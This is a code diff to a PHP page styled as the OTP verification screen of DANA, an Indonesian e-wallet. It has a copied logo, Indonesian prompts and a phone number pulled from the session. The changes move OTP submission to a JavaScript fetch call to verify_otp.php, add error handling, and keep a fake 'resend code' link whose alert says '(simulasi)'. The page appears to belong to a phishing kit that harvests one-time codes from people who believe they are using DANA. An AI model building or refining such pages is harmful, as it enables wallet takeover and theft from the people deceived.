@@ -29,34 +29,12 @@ $phone = $_SESSION['phone'] ?? '+62 812 3456 7890';
             width: 100%;
             max-width: 360px;
         }
-        .logo {
-            margin: 0 auto 12px;
-            display: block;
-        }
-        .lock-icon {
-            margin: 6px auto 10px;
-            display: block;
-        }
-        .title {
-            font-size: 20px;
-            font-weight: 700;
-            color: #1a1a1a;
-            margin-bottom: 4px;
-        }
-        .sub-info {
-            font-size: 14px;
-            color: #666;
-            margin-bottom: 20px;
-            line-height: 1.5;
-        }
-        .sub-info strong {
-            color: #1a1a1a;
-            font-weight: 600;
-        }
-        .otp-input-group {
-            position: relative;
-            margin-bottom: 16px;
-        }
+        .logo { margin: 0 auto 12px; display: block; }
+        .lock-icon { margin: 6px auto 10px; display: block; }
+        .title { font-size: 20px; font-weight: 700; color: #1a1a1a; margin-bottom: 4px; }
+        .sub-info { font-size: 14px; color: #666; margin-bottom: 20px; line-height: 1.5; }
+        .sub-info strong { color: #1a1a1a; font-weight: 600; }
+        .otp-input-group { position: relative; margin-bottom: 16px; }
         .otp-input-group input {
             width: 100%;
             padding: 16px 16px 16px 52px;
@@ -96,10 +74,8 @@ $phone = $_SESSION['phone'] ?? '+62 812 3456 7890';
             transition: all 0.15s;
             margin-top: 6px;
         }
-        .btn-verify:active {
-            transform: scale(0.97);
-            box-shadow: 0 3px 10px rgba(0,153,255,0.25);
-        }
+        .btn-verify:active { transform: scale(0.97); }
+        .btn-verify:disabled { opacity: 0.6; cursor: not-allowed; }
         .resend-link {
             display: inline-block;
             margin-top: 16px;
@@ -108,23 +84,15 @@ $phone = $_SESSION['phone'] ?? '+62 812 3456 7890';
             font-weight: 600;
             text-decoration: none;
             border-bottom: 1.5px dotted rgba(0,153,255,0.3);
+            cursor: pointer;
         }
-        .footer-note {
-            font-size: 12px;
-            color: #aaa;
-            margin-top: 20px;
-            letter-spacing: 0.3px;
-        }
-        .divider {
-            border: none;
-            border-top: 1px solid #edf2f7;
-            margin: 20px 0 12px;
-        }
+        .footer-note { font-size: 12px; color: #aaa; margin-top: 20px; }
+        .divider { border: none; border-top: 1px solid #edf2f7; margin: 20px 0 12px; }
+        .error-msg { color: #e74c3c; font-size: 13px; margin-top: 10px; display: none; }
     </style>
 </head>
 <body>
 <div class="card">
-    <!-- Logo DANA -->
     <svg class="logo" viewBox="0 0 200 60" width="120" height="36">
         <defs>
             <linearGradient id="logoGrad" x1="0%" y1="0%" x2="100%" y2="100%">
@@ -137,7 +105,6 @@ $phone = $_SESSION['phone'] ?? '+62 812 3456 7890';
         <text x="50" y="39" font-family="Arial, sans-serif" font-size="26" font-weight="700" fill="#1a1a1a">DANA</text>
     </svg>
 
-    <!-- Ikon gembok -->
     <svg class="lock-icon" width="64" height="50" viewBox="0 0 64 50">
         <circle cx="32" cy="20" r="20" fill="#0099ff" opacity="0.08"/>
         <rect x="14" y="18" width="36" height="26" rx="4" fill="none" stroke="#0099ff" stroke-width="1.8"/>
@@ -151,7 +118,7 @@ $phone = $_SESSION['phone'] ?? '+62 812 3456 7890';
         <strong><?php echo htmlspecialchars($phone); ?></strong>
     </div>
 
-    <form action="verify_otp.php" method="POST">
+    <form id="otpForm">
         <div class="otp-input-group">
             <span class="lock-left">
                 <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="2">
@@ -159,15 +126,59 @@ $phone = $_SESSION['phone'] ?? '+62 812 3456 7890';
                     <path d="M7 11V7a5 5 0 0 1 10 0v4" stroke="currentColor"/>
                 </svg>
             </span>
-            <input type="text" name="otp" placeholder="6 digit kode" maxlength="6" inputmode="numeric" pattern="[0-9]*" required autofocus>
+            <input type="text" id="otp" name="otp" placeholder="6 digit kode" maxlength="6" inputmode="numeric" pattern="[0-9]*" required autofocus>
         </div>
-        <button type="submit" class="btn-verify">Verifikasi</button>
+        <button type="submit" class="btn-verify" id="verifyBtn">Verifikasi</button>
+        <div class="error-msg" id="errorMsg">Gagal verifikasi, coba lagi.</div>
     </form>
 
-    <a href="#" class="resend-link" onclick="alert('Kode baru telah dikirim (simulasi)'); return false;">Kirim ulang kode</a>
+    <span class="resend-link" onclick="alert('Kode baru telah dikirim (simulasi)');">Kirim ulang kode</span>
 
     <hr class="divider">
     <div class="footer-note">DANA • Dompet Digital Indonesia</div>
 </div>
+
+<script>
+document.getElementById('otpForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const otp = document.getElementById('otp').value.trim();
+    const btn = document.getElementById('verifyBtn');
+    const errorMsg = document.getElementById('errorMsg');
+    
+    if (!otp || otp.length < 4) {
+        errorMsg.style.display = 'block';
+        errorMsg.textContent = 'Masukkan kode OTP yang valid (6 digit).';
+        return;
+    }
+    
+    errorMsg.style.display = 'none';
+    btn.disabled = true;
+    btn.textContent = 'Memverifikasi...';
+    
+    fetch('verify_otp.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: 'otp=' + encodeURIComponent(otp)
+    })
+    .then(response => {
+        if (response.redirected) {
+            window.location.href = response.url;
+        } else {
+            return response.text();
+        }
+    })
+    .then(data => {
+        if (data && data.includes('error')) {
+            throw new Error('Server error');
+        }
+    })
+    .catch(() => {
+        errorMsg.style.display = 'block';
+        errorMsg.textContent = 'Gagal terhubung ke server. Coba lagi.';
+        btn.disabled = false;
+        btn.textContent = 'Verifikasi';
+    });
+});
+</script>
 </body>
-</html>
+</html> 
